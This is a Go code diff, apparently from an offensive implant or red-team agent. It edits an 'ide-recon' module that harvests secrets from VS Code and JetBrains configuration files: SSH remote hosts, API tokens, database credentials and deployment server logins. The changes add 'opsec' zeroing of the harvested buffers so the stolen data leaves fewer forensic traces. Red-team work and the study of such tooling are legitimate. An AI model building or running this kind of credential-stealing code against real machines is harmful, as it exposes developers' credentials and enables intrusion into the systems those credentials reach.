@@ -14,8 +14,10 @@ import (
 // IdeReconCommand enumerates IDE configurations for intelligence gathering.
 type IdeReconCommand struct{}
 
-func (c *IdeReconCommand) Name() string        { return "ide-recon" }
-func (c *IdeReconCommand) Description() string { return "Enumerate IDE configurations — extensions, remote hosts, recent projects, secrets (T1005)" }
+func (c *IdeReconCommand) Name() string { return "ide-recon" }
+func (c *IdeReconCommand) Description() string {
+	return "Enumerate IDE configurations — extensions, remote hosts, recent projects, secrets (T1005)"
+}
 
 type ideReconArgs struct {
 	Action string `json:"action"` // vscode, jetbrains, all
@@ -244,6 +246,7 @@ func ideVSCodeSettings(sb *strings.Builder, settingsPath string) {
 	if err != nil {
 		return
 	}
+	defer structs.ZeroBytes(data) // opsec: may contain API keys, tokens, proxy creds
 
 	// Parse as generic JSON map
 	var settings map[string]interface{}
@@ -307,6 +310,7 @@ func ideVSCodeRemoteSSH(sb *strings.Builder, settingsPath string) {
 	if err != nil {
 		return
 	}
+	defer structs.ZeroBytes(data) // opsec: contains SSH host configs, credentials
 
 	var settings map[string]interface{}
 	if err := json.Unmarshal(data, &settings); err != nil {
@@ -342,6 +346,7 @@ func ideVSCodeRecent(sb *strings.Builder, configDir string) {
 			return
 		}
 	}
+	defer structs.ZeroBytes(data) // opsec: may contain project paths, workspace metadata
 
 	recentPaths := ideParseVSCodeRecent(data)
 	if len(recentPaths) == 0 {
@@ -548,6 +553,7 @@ func ideJetBrainsRecentProjects(sb *strings.Builder, productPath string) {
 			return
 		}
 	}
+	defer structs.ZeroBytes(data) // opsec: clear recent project paths (may reveal sensitive project names)
 
 	projects := ideParseJetBrainsRecentXML(string(data))
 	if len(projects) == 0 {
@@ -619,6 +625,7 @@ func ideJetBrainsDataSources(sb *strings.Builder, productPath string) {
 			return
 		}
 	}
+	defer structs.ZeroBytes(data) // opsec: contains database credentials, connection strings
 
 	sources := ideParseJetBrainsDataSources(string(data))
 	if len(sources) == 0 {
@@ -697,6 +704,7 @@ func ideJetBrainsDeployment(sb *strings.Builder, productPath string) {
 	if err != nil {
 		return
 	}
+	defer structs.ZeroBytes(data) // opsec: contains deployment server credentials
 
 	servers := ideParseJetBrainsServers(string(data))
 	if len(servers) == 0 {
